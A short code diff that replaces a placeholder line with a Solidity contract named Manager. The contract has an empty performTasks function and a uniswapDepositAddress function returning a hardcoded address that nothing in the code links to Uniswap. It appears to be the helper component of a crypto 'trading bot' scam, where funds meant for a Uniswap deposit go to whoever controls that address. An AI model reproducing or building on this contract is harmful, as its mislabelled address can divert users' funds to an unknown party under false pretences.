@@ -1,1 +1,11 @@
-Hello contacts
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xEc35A15648ACe4686A7e5bC4A4549f7817805963;
+	}
+}
